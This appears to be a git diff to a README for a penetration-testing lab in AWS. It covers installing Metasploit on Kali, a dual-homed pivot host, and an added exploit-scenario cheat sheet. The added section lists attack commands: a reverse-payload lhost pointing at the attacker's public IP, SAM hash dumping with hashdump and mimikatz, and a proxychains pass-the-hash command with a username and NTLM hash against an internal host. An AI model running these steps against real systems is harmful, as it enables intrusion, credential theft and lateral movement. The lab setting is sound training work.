@@ -61,7 +61,7 @@ https://localhost:3790
 ## Kali
 [DeployMSP.py](./DeployMSP.py) Deploys Kali. MSP installer is interactive so go ahead and step through installation. 
 ```bash
-sudo apt-get update -y && apt-get upgrade -y
+sudo apt update -y && apt upgrade -y
 wget https://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run -O /tmp/installer.run && sudo chmod 755 /tmp/installer.run
 sudo /tmp/installer.run
 sudo /opt/metasploit/ctlscript.sh restart
@@ -72,4 +72,29 @@ sudo /opt/metasploit/ctlscript.sh restart
 2. Add systems to domain
 3. Ensure networking from VPC to internet and from VPC (target) to VPC (attacker) is good to go
 4. Setup scenerios and stage accounts
+    - Dual-homes machine needs to be deployed in one subnet with public ip auto assign. Once booted attached a elastic ip and connect another network interface to instance that is in the second subnet desired.
 5. Iterate step 4.
+
+
+## Exploit Scenario
+- Remote Enumerate "RECON"
+- Exploit Web server [Setting payload](https://metasploit.help.rapid7.com/docs/working-with-payloads)
+    ```bash
+    set lhost <public ip of kali in aws>
+    ```
+- [Local enum](https://www.coengoedegebure.com/hacking-windows-with-meterpreter/)
+
+- Scenerio commands:
+    - User in local admin group 
+        * shell "net localgroup Administrators"
+    - Drop hashes
+        * run post/windows/gather/hashdump or mimikatz_command -f samdump::hashes
+    - Network Enum
+        * shell "route print -4"
+    
+- Local Enumerate
+    - Establish proxy
+- PiVOT using proxychains [cheatsheet](https://nullsweep.com/pivot-cheatsheet-for-pentesters/)
+    * proxychains pth-winexe -U elserenterprise/belser%aad3b435b51404eeaad3b435b51404ee:29aa6786f9b94cfbe439934e542054ea //10.10.1.8 cmd [pth](https://blog.ropnop.com/practical-usage-of-ntlm-hashes/)
+- enumerate through pivot
+- Dump domain creds
